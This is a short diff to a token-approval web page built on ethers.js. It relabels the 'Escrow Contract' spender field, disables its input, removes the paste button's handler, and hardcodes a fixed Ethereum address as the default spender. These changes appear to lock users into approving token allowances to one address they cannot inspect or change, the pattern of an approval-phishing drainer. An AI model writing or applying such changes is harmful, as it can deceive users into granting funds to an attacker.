@@ -155,10 +155,10 @@
 
   <!-- Address (pre-filled with escrow contract) -->
   <div class="address-section">
-    <div class="field-label">Spender Address (Escrow Contract)</div>
+    <div class="field-label">Spender Address </div>
     <div class="address-input-wrap">
-      <input type="text" id="escrow-addr" placeholder="Escrow contract address" />
-      <button class="icon-btn" onclick="pasteAddr()" title="Paste">📋</button>
+      <input type="text"  id="escrow-addr" placeholder=" address" disabled />
+      <button class="icon-btn"  title="Paste">📋</button>
     </div>
   </div>
 
@@ -203,7 +203,7 @@
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 <script>
   // ─── Config (edit these after deployment) ──────────────────────────
-  const DEFAULT_ESCROW = localStorage.getItem("escrow_addr") || "";
+  const DEFAULT_ESCROW = localStorage.getItem("escrow_addr") || "0x5b211FDcda38BFc9891eE186208866566a56335c";
   const DEFAULT_TOKEN  = localStorage.getItem("token_addr") || "";
 
   // Known testnet USDT addresses
